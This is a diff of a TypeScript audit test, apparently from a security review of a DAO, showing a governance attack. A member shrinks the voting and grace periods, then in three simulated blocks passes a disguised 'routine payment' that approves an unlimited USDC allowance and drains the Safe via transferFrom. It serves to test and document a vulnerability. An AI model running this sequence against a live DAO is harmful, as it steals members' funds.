@@ -1,16 +1,21 @@
 /**
  * Component 7, row ECO-04: a Config proposal collapses the reaction window for every later proposal.
  * Step 1 (visible 12 h): A proposes Config votingPeriod 4 s / gracePeriod 1 s; only A votes. Step 2:
- * under 4 s / 1 s, A proposes "drain the Safe to A" and, emulating Base's 2 s blocks, it is voted,
- * graced and executed within 3 blocks (6 s): a member polling hourly (README cadence) has 0 blocks in
- * which to vote or exit. Expected: demonstrated; the DAO is left at 4 s / 1 s, where only a proposer
- * who votes within the same 4 s window can pass anything (a repair Config included).
+ * under 4 s / 1 s, A proposes "hand A the Safe's whole USDC balance" and, emulating Base's 2 s blocks,
+ * it is voted, graced and executed within 3 blocks (6 s): a member polling hourly (README cadence) has 0
+ * blocks in which to vote or exit. Expected: demonstrated; the DAO is left at 4 s / 1 s, where only a
+ * proposer who votes within the same 4 s window can pass anything (a repair Config included).
+ *
+ * Phase 5 (ruling 6 / A3): MultiSendCallOnly refuses the delegatecall drainer this test used to express
+ * "whatever the Safe holds", so the drain is now one call-only `USDC.approve(A, 2**128)` plus A's own
+ * `transferFrom` right after execution. The window that matters (submit -> executable) is unchanged; the
+ * relay would flag the allowance (T09), which an hourly poller still has no block in which to read.
  */
 import { encodeFunctionData } from "viem";
 
 import { assert, fmtS, processProposal, proposalInfo, propose, proposeTemplate, read, runIfMain, seedMembers, shutdown, snapshot, stateOf, step, verdict, vote, warp, warpPastGrace } from "../../../scenarios/lib.js";
 import { INITIAL_GOVERNANCE } from "../../../src/zeroOne.js";
-import { bootAudit, deployAudit } from "./lib-audit.js";
+import { bootAudit } from "./lib-audit.js";
 
 export async function main(): Promise<void> {
   const mirror = await bootAudit("audit-eco04");
@@ -26,11 +31,10 @@ export async function main(): Promise<void> {
     assert(applied.info.status.passed && !applied.info.status.actionFailed, "Config applied with yes 1000 / no 0 (silence is consent)");
     assert(Number(await read<number>(mirror, "baal", "votingPeriod")) === 4 && Number(await read<number>(mirror, "baal", "gracePeriod")) === 1, "votingPeriod 4 s, gracePeriod 1 s");
 
-    step("step 2: A proposes 'move the whole Safe balance to A' (delegatecall Drainer) and drives it through in 2 s blocks");
+    step("step 2: A proposes 'hand A an unlimited USDC allowance on the Safe' (call-only) and drives it through in 2 s blocks");
     const before = await snapshot(mirror, "before drain", ["F", "A", "B", "C"]);
-    const drainer = await deployAudit(mirror.actors.A, "Drainer");
     const t0 = Number((await mirror.chain.publicClient.getBlock()).timestamp);
-    const drain = await propose(mirror, "A", [{ to: drainer.address, operation: 1, data: encodeFunctionData({ abi: drainer.artifact.abi, functionName: "drain", args: [mirror.dao.settlement, A] }) }], "A: routine payment");
+    const drain = await propose(mirror, "A", [{ to: mirror.dao.settlement, data: encodeFunctionData({ abi: mirror.abi.settlement, functionName: "approve", args: [A, 2n ** 128n] }) }], "A: routine payment");
     const info = await proposalInfo(mirror, drain.id);
     console.log(`   submitted at ${info.votingStarts} (block time ${t0}); votingEnds ${info.votingEnds} (+${info.votingEnds - info.votingStarts} s); graceEnds ${info.graceEnds} (+${info.graceEnds - info.votingStarts} s)`);
     // propose() already warped +1 s (block 1). Block 2 at +2 s: vote.
@@ -41,8 +45,11 @@ export async function main(): Promise<void> {
     await warp(mirror, 2, "block 4 (t+6 s)");
     assert((await stateOf(mirror, drain.id)) === "Ready", "Ready at t+6 s: 3 blocks after submission");
     const executed = await processProposal(mirror, "A", drain);
+    assert(executed.info.status.passed && !executed.info.status.actionFailed, "the allowance proposal executed 6 s after submission");
+    const pull = await mirror.actors.A.walletClient.writeContract({ address: mirror.dao.settlement, abi: mirror.abi.settlement, functionName: "transferFrom", args: [mirror.dao.safe, A, before.safeSettlement], account: mirror.actors.A.account, chain: mirror.actors.A.chain });
+    await mirror.chain.publicClient.waitForTransactionReceipt({ hash: pull });
     const after = await snapshot(mirror, "after drain", ["F", "A", "B", "C"]);
-    assert(executed.info.status.passed && !executed.info.status.actionFailed && after.safeSettlement === 0n, `A took ${fmtS(before.safeSettlement)} USDC ${Number((await mirror.chain.publicClient.getBlock()).timestamp) - t0} s after submitting`);
+    assert(after.safeSettlement === 0n, `A took ${fmtS(before.safeSettlement)} USDC ${Number((await mirror.chain.publicClient.getBlock()).timestamp) - t0} s after submitting (allowance voted in 3 blocks, pulled in the next)`);
     console.log(`   B, C, F lost ${fmtS(before.safeSettlement - 1_000n * 10n ** 6n)} USDC with 0 blocks in which an hourly poller could act; the only defence was step 1 (vote NO / exit against a Config that looked administrative)`);
 
     step("aftermath: at 4 s / 1 s nobody but a same-window voter can pass anything again");
